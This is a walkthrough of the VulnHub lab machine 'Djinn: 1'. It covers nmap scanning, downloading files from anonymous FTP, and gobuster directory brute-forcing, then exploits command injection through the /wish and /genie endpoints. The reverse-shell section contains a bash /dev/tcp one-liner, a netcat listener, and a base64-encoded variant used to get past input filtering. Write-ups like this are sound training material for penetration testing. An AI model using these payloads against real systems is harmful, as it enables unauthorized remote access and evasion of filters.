# Djinn: 1

- **Machine:** Djinn: 1
- **Download:** https://www.vulnhub.com/entry/djinn-1,397/

![](810-1.png)

---

## Setup

- Import the `.ova` file into VirtualBox.
- Click **Finish**.
- Start the virtual machine.

---

# Network Scanning

## Find the Target IP Address

```bash
nmap -sn 192.168.2.0/24
```

![](810-2.png)

---

## Full Port Scan

Run a comprehensive Nmap scan to enumerate all open ports, services, operating system details, and default NSE scripts.

```bash
nmap -v -Pn -sT -sV -sC -A -O -p- 192.168.2.155
```

![](810-3.png)

---

## Optional Port Scan

```bash
nmap -v -p- 192.168.2.155
```

```bash
nmap -sC -sV -A 192.168.2.155
```

---

# FTP Enumeration

## Connect to the FTP Server

```bash
ftp 192.168.2.155
```

---

## Enumerate the FTP Directory

List the available files.

```bash
ls
```

Download the discovered files.

```bash
get creds.txt
```

```bash
get game.txt
```

```bash
get message.txt
```

![](810-4.png)

---

## Review the Downloaded Files

```bash
cat creds.txt
```

```bash
cat game.txt
```

```bash
cat message.txt
```

![](810-5.png)

---

# Web Enumeration

Visit the web application running on port **7331**.

- http://192.168.2.155:7331/

---

## Directory Enumeration

Perform directory brute-forcing.

```bash
gobuster dir -u http://192.168.2.155:7331/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

![](810-6.png)

---

## Interesting Endpoints

Visit the following endpoints:

- http://192.168.2.155:7331/wish

![](810-7.png)

- http://192.168.2.155:7331/genie

![](810-8.png)

---

## Test for Command Injection

The `/wish` endpoint accepts user input that is reflected by the `/genie` endpoint.

Test command execution.

```text
id
```

Submit the request:

```text
http://192.168.2.155:7331/genie?name=uid%3D33%28www-data%29+gid%3D33%28www-data%29+groups%3D33%28www-data%29%0A
```

![](810-9.png)

Successful execution confirms command injection.

---

# Reverse Shell (Lab)

> **Lab note:** The following steps are intended only for an authorized practice machine such as this VulnHub VM.

## Start a Listener

```bash
nc -nlvp 443
```

---

## Initial Reverse Shell Payload

```bash
bash -c 'bash -i >& /dev/tcp/192.168.2.219/443 0>&1'
```

![](810-10.png)

The payload is blocked and does not execute successfully.

![](810-11.png)

---

## Encode the Payload

Encode the payload using Base64.

```bash
echo -n 'bash -i >& /dev/tcp/192.168.2.219/443 0>&1' | base64 -w 0
```

![](810-12.png)

---

## Final Payload

Execute the Base64-decoded payload.

```bash
echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjIuMjE5LzQ0MyAwPiYx | base64 -d | bash
```

---

## Obtain the Reverse Shell

Submit the payload through the vulnerable endpoint.

![](810-13.png)

A reverse shell is successfully established.

![](810-14.png)

---

# Impact

- Anonymous FTP exposed sensitive files.
- Information disclosure assisted further enumeration.
- Command Injection vulnerability allowed arbitrary command execution.
- Base64 encoding bypassed simple input restrictions.
- Remote Code Execution (RCE) provided shell access to the target system.

---

# Key Learning

- Always enumerate FTP services for sensitive files.
- Hidden web endpoints may expose command execution functionality.
- Test for command injection using simple commands before attempting complex payloads.
- Base64 encoding can bypass basic input filtering mechanisms.
- Successful command injection can be escalated into a reverse shell.

---

# Summary

The assessment began with FTP enumeration, where several files containing useful information were discovered. Web enumeration identified the `/wish` and `/genie` endpoints, which were vulnerable to command injection. After verifying arbitrary command execution, an initial reverse shell payload was blocked by input filtering. Encoding the payload with Base64 bypassed the restriction, resulting in successful remote code execution and an interactive shell on the target machine.